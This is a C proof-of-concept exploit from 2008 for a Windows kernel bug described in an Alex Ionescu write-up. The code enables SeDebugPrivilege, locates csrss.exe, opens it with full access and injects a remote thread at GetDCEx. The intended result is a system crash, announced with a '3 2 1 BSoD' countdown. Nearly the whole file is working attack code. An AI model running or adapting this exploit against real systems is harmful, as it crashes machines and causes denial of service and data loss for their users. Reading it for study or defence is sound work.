////////////////////////////////////////////////////////////////////////////////////
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | Bug 1:                                                                     | //
// | 1) NtQuerySystemInformation(SystemProcessesAndThreadsInformation, ...);    | //
// | 2) NtOpenProcess(..., ClientId->CsrssProcessId);                           | //
// | 3) CreateRemoteThread(..., NtUserGetDCEx, ...);                            | //
// |                                                                            | //
// | Reference:                                                                 | //
// | Pointers and Handles                                                       | //
// | A Story of Unchecked Assumptions in the Windows Kernel                     | //
// |                                                                            | //
// | Alex Ionescu                                                               | //
// | http://www.alex-ionescu.com/?p=61                                          | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | NtInternals - http://www.ntinternals.org/                                  | //
// | alex ntinternals org                                                       | //
// | 04 September 2008                                                          | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define IMP_SYSCALL __declspec(dllimport) NTSTATUS __stdcall

#define NtCurrentProcess() ((HANDLE)0xFFFFFFFF)

#define SE_DEBUG_PRIVILEGE 20

#define OBJ_CASE_INSENSITIVE 0x00000040

#define PAGE_SIZE 0x1000

#define STATUS_SUCCESS 0x00000000

typedef ULONG NTSTATUS;
typedef LONG KPRIORITY;

typedef struct _UNICODE_STRING 
{
	/* 0x00 */ USHORT Length;
	/* 0x02 */ USHORT MaximumLength;
	/* 0x04 */ PWSTR Buffer;
	/* 0x08 */
}
	UNICODE_STRING,
  *PUNICODE_STRING,
**PPUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	/* 0x00 */ ULONG Length;
	/* 0x04 */ HANDLE RootDirectory;
	/* 0x08 */ PUNICODE_STRING ObjectName;
	/* 0x0C */ ULONG Attributes;
	/* 0x10 */ PSECURITY_DESCRIPTOR SecurityDescriptor;
	/* 0x14 */ PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;
	/* 0x18 */
}
	OBJECT_ATTRIBUTES,
  *POBJECT_ATTRIBUTES,
**PPOBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
}
	CLIENT_ID,
  *PCLIENT_ID,
**PPCLIENT_ID;

typedef struct _VM_COUNTERS
{
    ULONG PeakVirtualSize;
    ULONG VirtualSize;
    ULONG PageFaultCount;
    ULONG PeakWorkingSetSize;
    ULONG WorkingSetSize;
    ULONG QuotaPeakPagedPoolUsage;
    ULONG QuotaPagedPoolUsage;
    ULONG QuotaPeakNonPagedPoolUsage;
    ULONG QuotaNonPagedPoolUsage;
    ULONG PagefileUsage;
    ULONG PeakPagefileUsage;
}
	VM_COUNTERS,
  *PVM_COUNTERS,
**PPVM_COUNTERS;

typedef enum _KWAIT_REASON
{
	Executive = 0,
	FreePage = 1,
	PageIn = 2,
	PoolAllocation = 3,
	DelayExecution = 4,
	Suspended = 5,
	UserRequest = 6,
	WrExecutive = 7,
	WrFreePage = 8,
	WrPageIn = 9,
	WrPoolAllocation = 10,
	WrDelayExecution = 11,
	WrSuspended = 12,
	WrUserRequest = 13,
	WrEventPair = 14,
	WrQueue = 15,
	WrLpcReceive = 16,
	WrLpcReply = 17,
	WrVirtualMemory = 18,
	WrPageOut = 19,
	WrRendezvous = 20,
	Spare2 = 21,
	Spare3 = 22,
	Spare4 = 23,
	Spare5 = 24,
	WrCalloutStack = 25,
	WrKernel = 26,
	WrResource = 27,
	WrPushLock = 28,
	WrMutex = 29,
	WrQuantumEnd = 30,
	WrDispatchInt = 31,
	WrPreempted = 32,
	WrYieldExecution = 33,
	WrFastMutex = 34,
	WrGuardedMutex = 35,
	WrRundown = 36,
	MaximumWaitReason = 37
} KWAIT_REASON;

typedef struct _IO_COUNTERSEX
{
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
}
	IO_COUNTERSEX,
  *PIO_COUNTERSEX,
**PPIO_COUNTERSEX;

typedef enum _THREAD_STATE
{
    StateInitialized,
    StateReady,
    StateRunning,
    StateStandby,
    StateTerminated,
    StateWait,
    StateTransition,
    StateUnknown
} THREAD_STATE;

typedef struct _SYSTEM_THREADS
{
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    KPRIORITY Priority;
    KPRIORITY BasePriority;
    ULONG ContextSwitchCount;
    THREAD_STATE State;
    KWAIT_REASON WaitReason;
}
	SYSTEM_THREADS,
  *PSYSTEM_THREADS,
**PPSYSTEM_THREADS;

typedef struct _SYSTEM_PROCESSES
{
    ULONG NextEntryDelta;
    ULONG ThreadCount;
    ULONG Reserved1[6];
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ProcessName;
    KPRIORITY BasePriority;
    ULONG ProcessId;
    ULONG InheritedFromProcessId;
    ULONG HandleCount;
    ULONG Reserved2[2];
    VM_COUNTERS VmCounters;
    IO_COUNTERSEX IoCounters;
    SYSTEM_THREADS Threads[1];
}
	SYSTEM_PROCESSES,
  *PSYSTEM_PROCESSES,
**PPSYSTEM_PROCESSES;

typedef enum _SYSTEM_INFORMATION_CLASS
{
	SystemBasicInformation,
	SystemProcessorInformation,
	SystemPerformanceInformation,
	SystemTimeOfDayInformation,
	SystemNotImplemented1,
	SystemProcessesAndThreadsInformation,
	SystemCallCounts,
	SystemConfigurationInformation,
	SystemProcessorTimes,
	SystemGlobalFlag,
	SystemNotImplemented2,
	SystemModuleInformation,
	SystemLockInformation,
	SystemNotImplemented3,
	SystemNotImplemented4,
	SystemNotImplemented5,
	SystemHandleInformation,
	SystemObjectInformation,
	SystemPagefileInformation,
	SystemInstructionEmulationCounts,
	SystemInvalidInfoClass1,
	SystemCacheInformation,
	SystemPoolTagInformation,
	SystemProcessorStatistics,
	SystemDpcInformation,
	SystemNotImplemented6,
	SystemLoadImage,
	SystemUnloadImage,
	SystemTimeAdjustment,
	SystemNotImplemented7,
	SystemNotImplemented8,
	SystemNotImplemented9,
	SystemCrashDumpInformation,
	SystemExceptionInformation,
	SystemCrashDumpStateInformation,
	SystemKernelDebuggerInformation,
	SystemContextSwitchInformation,
	SystemRegistryQuotaInformation,
	SystemLoadAndCallImage,
	SystemPrioritySeparation,
	SystemNotImplemented10,
	SystemNotImplemented11,
	SystemInvalidInfoClass2,
	SystemInvalidInfoClass3,
	SystemTimeZoneInformation,
	SystemLookasideInformation,
	SystemSetTimeSlipEvent,
	SystemCreateSession,
	SystemDeleteSession,
	SystemInvalidInfoClass4,
	SystemRangeStartInformation,
	SystemVerifierInformation,
	SystemAddVerifier,
	SystemSessionProcessesInformation
} SYSTEM_INFORMATION_CLASS;

IMP_SYSCALL NtQuerySystemInformation
(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
);

IMP_SYSCALL NtAllocateVirtualMemory
(
	IN HANDLE ProcessHandle,
	IN OUT PVOID *BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PULONG AllocationSize,
	IN ULONG AllocationType,
	IN ULONG Protect
);

IMP_SYSCALL NtFreeVirtualMemory
(
	IN HANDLE ProcessHandle,
	IN OUT PVOID *BaseAddress,
	IN OUT PULONG FreeSize,
	IN ULONG FreeType
);

IMP_SYSCALL NtOpenProcess
(
	OUT PHANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PCLIENT_ID ClientId OPTIONAL
);

IMP_SYSCALL NtOpenProcessToken
(
	IN HANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	OUT PHANDLE TokenHandle
);

IMP_SYSCALL NtAdjustPrivilegesToken
(
	IN HANDLE TokenHandle,
	IN BOOLEAN DisableAllPrivileges,
	IN PTOKEN_PRIVILEGES NewState,
	IN ULONG BufferLength,
	OUT PTOKEN_PRIVILEGES PreviousState OPTIONAL,
	OUT PULONG ReturnLength
);

IMP_SYSCALL NtDelayExecution
(
	IN BOOLEAN Alertable,
	IN PLARGE_INTEGER Interval
);

IMP_SYSCALL NtClose
(
	IN HANDLE Handle
);

NTSTATUS XxAdjustPrivileges(ULONG Privilege)
{
	NTSTATUS NtStatus;
	HANDLE TokenHandle;

	LUID Luid;
	TOKEN_PRIVILEGES TokenPrivileges;
	
	Luid.LowPart = Privilege;
	Luid.HighPart = 0;

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Luid = Luid;
	TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	NtStatus = NtOpenProcessToken(
								  NtCurrentProcess(),						// ProcessHandle
								  TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,	// DesiredAccess
								  &TokenHandle);							// TokenHandle
	
	if(NtStatus)
	{
		printf(" [*] NtStatus of NtOpenProcessToken - 0x%.8X\n", NtStatus);
		return NtStatus;
	}

	NtStatus = NtAdjustPrivilegesToken(
									   TokenHandle,					// TokenHandle
									   FALSE,						// DisableAllPrivileges
									   &TokenPrivileges,			// NewState
									   sizeof(TOKEN_PRIVILEGES),	// BufferLength
									   (PTOKEN_PRIVILEGES)NULL,		// PreviousState
									   0);							// ReturnLength
	if(NtStatus)
	{
		printf(" [*] NtStatus of NtAdjustPrivilegesToken - 0x%.8X\n", NtStatus);
		return NtStatus;
	}

	NtStatus = NtClose(TokenHandle);	// Handle

	if(NtStatus)
	{
		printf(" [*] NtStatus of NtClose - 0x%.8X\n", NtStatus);
		return NtStatus;
	}

	return STATUS_SUCCESS;
}

int __cdecl main(int argc, char **argv)
{
	NTSTATUS NtStatus;
	
	ULONG UniqueProcess;
	HANDLE ProcessHandle;
	ULONG ThreadId;
	HANDLE ThreadHandle;
	ULONG AllocationSize = PAGE_SIZE*64;

	CLIENT_ID ClientId;
	OBJECT_ATTRIBUTES ObjectAttributes;
	PSYSTEM_PROCESSES ProcessInformationAddress = NULL;
	PSYSTEM_PROCESSES ProcessInformation = NULL;
	LARGE_INTEGER Interval;
	
	///////////////////////////////////////////////////////////////////////////////////////////////
	
	system("cls");
	
	printf( " +----------------------------------------------------------------------------+\n"
			" |                                                                            |\n"
			" | Bug 1:                                                                     |\n"
			" | 1) NtQuerySystemInformation(SystemProcessesAndThreadsInformation, ...);    |\n"
			" | 2) NtOpenProcess(..., ClientId->CsrssProcessId);                           |\n"
			" | 3) CreateRemoteThread(..., NtUserGetDCEx, ...);                            |\n"
			" |                                                                            |\n"
			" | Reference:                                                                 |\n"
			" | Pointers and Handles                                                       |\n"
			" | A Story of Unchecked Assumptions in the Windows Kernel                     |\n"
			" |                                                                            |\n"
			" | Alex Ionescu                                                               |\n"
			" | http://www.alex-ionescu.com/?p=61                                          |\n"
			" |                                                                            |\n"
			" +----------------------------------------------------------------------------+\n"
			" |                                                                            |\n"
			" | NtInternals - http://www.ntinternals.org/                                  |\n"
			" | alex ntinternals org                                                       |\n"
			" | 04 September 2008                                                          |\n"
			" |                                                                            |\n"
			" +----------------------------------------------------------------------------+\n\n");

	///////////////////////////////////////////////////////////////////////////////////////////////
	
	NtStatus = XxAdjustPrivileges(SE_DEBUG_PRIVILEGE);

	if(NtStatus)
	{
		return NtStatus;
	}


	NtStatus = NtAllocateVirtualMemory(
									   NtCurrentProcess(),			// ProcessHandle
									   &ProcessInformation,			// BaseAddress
									   0,							// ZeroBits
									   &AllocationSize,				// AllocationSize
									   MEM_COMMIT,					// AllocationType
									   PAGE_READWRITE);				// Protect


	if(NtStatus)
	{
		printf(" [*] NtStatus of NtAllocateVirtualMemory - 0x%.8X\n", NtStatus);	
		return NtStatus;
	}

	ProcessInformationAddress = ProcessInformation;
	
	memset(ProcessInformation, 0, AllocationSize);
			

	NtStatus = NtQuerySystemInformation(
										SystemProcessesAndThreadsInformation,	// SystemInformationClass
										ProcessInformation,						// SystemInformation
										AllocationSize,							// SystemInformationLength
										NULL);									// ReturnLength
				
	if(NtStatus)
	{
		printf(" [*] NtStatus of NtQuerySystemInformation - 0x%.8X\n", NtStatus);	
		return NtStatus;
	}
	
	while(ProcessInformation->NextEntryDelta)
	{
		if(ProcessInformation->ProcessName.Length)
		{
			if(!memcmp(ProcessInformation->ProcessName.Buffer, L"csrss.exe", strlen("csrss.exe")*2))
			{
				printf( " +----------------------------------------------------------------------------+\n"
						" |                                                                            |\n"
						" | ProcessImageName - %ws                                               |\n"
						" | ProcessId - %.4d                                                           |\n",
						ProcessInformation->ProcessName.Buffer,
						ProcessInformation->ProcessId);
				
				UniqueProcess = ProcessInformation->ProcessId;
				
				break;
			}
		}

		ProcessInformation = (PSYSTEM_PROCESSES)((PUCHAR)(ProcessInformation) + ProcessInformation->NextEntryDelta);
	}

	
	NtStatus = NtFreeVirtualMemory(
								   NtCurrentProcess(),			// ProcessHandle
								   &ProcessInformationAddress,	// BaseAddress
								   &AllocationSize,				// FreeSize
								   MEM_RELEASE);				// FreeType
		
	if(NtStatus)
	{
		printf(" [*] NtStatus of NtFreeVirtualMemory - 0x%.8X\n", NtStatus);	
		return NtStatus;
	}
	
	ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	ObjectAttributes.RootDirectory = 0;
	ObjectAttributes.ObjectName = NULL;
	ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
	ObjectAttributes.SecurityDescriptor = NULL;
	ObjectAttributes.SecurityQualityOfService = NULL;

	ClientId.UniqueProcess = (HANDLE)UniqueProcess;
	ClientId.UniqueThread = 0;

	
	NtStatus = NtOpenProcess(
							 &ProcessHandle,		// ProcessHandle
							 PROCESS_ALL_ACCESS,	// DesiredAccess
							 &ObjectAttributes,		// ObjectAttributes
							 &ClientId);			// ClientId

	if(NtStatus)
	{
		printf(" [*] NtStatus of NtOpenProcess - 0x%.8X\n", NtStatus);
		return NtStatus;
	}

	printf(	" | ProcessHandle - 0x%.4X                                                     |\n"
			" |                                                                            |\n"
			" +----------------------------------------------------------------------------+\n\n",
			ProcessHandle);
	
	
	Interval.LowPart = 0xFF676980;
	Interval.HighPart = 0xFFFFFFFF;

	printf(" 3");
	NtDelayExecution(FALSE,	&Interval);
	
	printf(" 2");
	NtDelayExecution(FALSE,	&Interval);

	printf(" 1");
	NtDelayExecution(FALSE,	&Interval);

	printf(" BSoD\n\n");
	NtDelayExecution(FALSE,	&Interval);


	ThreadHandle = CreateRemoteThread(
									  ProcessHandle,					// ProcessHandle
									  NULL,								// ThreadAttributes
									  0,								// StackSize
									  (LPTHREAD_START_ROUTINE)GetDCEx,	// StartAddress
									  NULL,								// Parameter
									  0,								// CreationFlags
									  &ThreadId);						// ThreadId
	
	if(!ThreadHandle)
	{
		printf(" [*] Error of CreateRemoteThread - %.8d\n", GetLastError());
		return GetLastError();
	}

	
	NtClose(ProcessHandle);		// Handle

	if(NtStatus)
	{
		printf(" [*] NtStatus of NtClose - 0x%.8X\n", NtStatus);
		return NtStatus;
	}

	return 0;
}